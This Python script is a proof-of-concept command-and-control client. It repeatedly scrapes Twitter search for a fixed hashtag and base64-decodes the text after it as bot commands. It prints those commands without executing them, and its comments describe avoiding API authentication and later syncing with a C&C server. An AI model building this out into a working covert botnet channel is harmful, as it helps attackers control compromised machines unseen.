#!/usr/bin/python

# sudo pip install requests
# sudo pip install beautifulsoup4

import requests
from bs4 import BeautifulSoup
import base64
import sys
import time

POLLING_TIME = 5 * 60 # 5 minutes
HASHTAG = "%23CMLVHDO98"

# scrape tweets from web UI, API calls limit number of requests and require auth, we don't like that ;)
# perform query to twitter and return inner text of found coincidences
def getTweets(q):
	response = requests.get('https://twitter.com/search?q=%s'% q)
	soup = BeautifulSoup(response.text)
	inner_text = []	
	for p in soup.find_all("p", class_="js-tweet-text tweet-text"):
		inner_text.append(p.get_text())
	return inner_text

# return the a hashtag, later from the hastag we can obtain a basic command.
# TODO: for now we use a static hashtag for testing purposes, in the future the hashtag should be sync with the C&C
def buildHashtag():
	return HASHTAG

# message has the following format #hashtag base64string, ie: {#hashtag} {space} {base64 representation of a string}
# return base64 message, return null if does not match criteria
# TODO: msg should be asymmetric encryption or find a way to auth msg.
def getMessage(msg):
	parsemsg = None	
	try:
		parsemsg = msg.split(' ', 1 )[1].decode('base64')
	# something went wrong, we where unable to decode or so, I don't care, in this case we don't have a valid message	
	except:
		pass		
		#print "Unexpected error:", sys.exc_info()[0]
	return parsemsg

def main():	
	print('Hello, welcome to Social Network C&C PoC Client..')
	print()	
	while True:	
		print('Searching for new commands')
		print('Current hashtag: %s' % HASHTAG)
		possiblecommands = getTweets(buildHashtag())
		print('Parsing results')
		for p in possiblecommands:
			decodeString = getMessage(p)
			if decodeString != None:
				print('Valid command string found: %s' %decodeString)
				print()
		print('next query will be in %s seconds' % POLLING_TIME)
		time.sleep(POLLING_TIME)	
	

if __name__ == '__main__':
    main()
